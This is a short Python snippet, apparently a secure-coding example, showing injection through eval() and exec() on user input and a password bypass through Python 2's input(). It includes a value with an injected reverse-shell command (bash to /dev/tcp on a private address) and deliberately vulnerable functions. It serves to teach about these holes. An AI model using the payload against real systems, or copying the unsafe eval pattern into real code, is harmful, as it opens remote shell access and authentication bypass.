# Exploit of eval()
def addition(a, b):
  return eval("%s + %s" % (a, b))
 
# Such an input might be a JSON response to a network request
userinput = {
  "a": "__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#",
  "b": "2"
}
result = addition(userinput['a'], userinput['b'])
print("The result is %d." % result)
 
 
# --------------------------------------------------
# Exploit of exec()
# Can be exploited in the same way as eval()
def addition(a, b):
  return exec("%s + %s" % (a, b))
 
 
# --------------------------------------------------
# Bypass authentication in Python2's input()
# Python3's input() will convert input to a string and is therefore safer
user_pass = get_user_pass("admin")
if user_pass == input("Please enter your password"):
  login()
else:
  print "Password is incorrect!"
 
# Bypass authentication if user enters 'user_pass'
# if user_pass == user_pass: // this will evaluate as true

